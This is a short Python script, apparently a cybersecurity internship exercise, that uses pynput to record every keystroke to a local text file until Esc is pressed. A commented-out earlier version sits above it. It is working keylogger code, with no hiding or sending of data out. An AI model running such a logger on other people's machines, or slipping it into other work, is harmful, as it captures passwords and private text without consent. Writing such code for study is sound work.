# from pynput.keyboard import Key, Listener

# log_file = "/Users/jayvaja/VS/Prodigy Infotech Internship/PRODIGY_CS_04/keylog.txt" 

# def on_press(key):
#     try:
#         with open(log_file, "a") as f:
#             f.write(f"{key}\n")
#     except Exception as e:
#         print(f"Error logging key: {e}")

# def on_release(key):
#     if key == Key.esc:
#         return False  # Stop listener

# # Create a listener for keyboard events
# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()


from pynput import keyboard

log_file = "/Users/jayvaja/VS/Prodigy Infotech Internship/PRODIGY_CS_04/key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as log:
            if key == keyboard.Key.space:
                log.write(" ")
            elif key == keyboard.Key.enter:
                log.write("\n")
            else:
                log.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()




#